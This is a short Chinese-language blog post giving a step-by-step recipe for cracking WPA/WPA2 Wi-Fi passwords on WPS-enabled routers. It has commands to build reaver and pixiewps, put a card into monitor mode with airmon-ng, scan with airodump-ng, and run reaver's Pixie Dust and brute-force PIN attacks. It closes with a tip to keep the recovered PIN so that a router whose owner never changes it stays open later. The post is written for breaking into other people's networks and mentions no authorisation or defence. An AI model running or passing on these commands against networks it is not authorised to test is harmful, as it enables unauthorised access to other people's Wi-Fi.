---
layout: default
title:  "reaver破解Wi-Fi密码"
date:   2016-12-31 17:35
categories: jekyll update
---
[reaver最新版主页](https://github.com/t6x/reaver-wps-fork-t6x)  
[pixiewps主页](https://github.com/wiire/pixiewps)  
[mdk3攻击路由器](https://lexuge.github.io/jekyll/update/2016/08/28/%E4%BD%BF%E7%94%A8mdk3+aircrack-ng%E6%94%BB%E5%87%BB%E8%B7%AF%E7%94%B1%E5%99%A8.html)  
借助最新的工具reaver可以破解WPA/WPA2（带有WPS）的路由器  
1. 编译reaver  
```
git clone https://github.com/t6x/reaver-wps-fork-t6x
cd reaver-wps-fork-t6x*/
cd src/
./configure
make
sudo make install
```
2. 编译pixiewps  
```
git clone https://github.com/wiire/pixiewps
cd pixiewps*/
cd src/
make
sudo make install
```
3. 使用reaver  
使用```reaver -h```可显示帮助  
- 使网卡变为监听模式:```sudo airmon-ng start wlp2s0```(具体步骤见mdk3攻击路由器的前几步)  
- 搜索附近路由:```sudo airodump-ng wlp2s0mon```  
接下来就可以使用reaver了  
若要在几秒钟内瞬间得到密码(不保证适应全部路由):```reaver -i wlp2s0mon -b (MAC) -vvv -K 1```  
若要100%得到密码(几个小时以上):```reaver -i wlp2s0mon -b (MAC)```  
Tip:得到密码后一定要记下PIN，这样下次就可以直接获得密码(对方不更改PIN)  


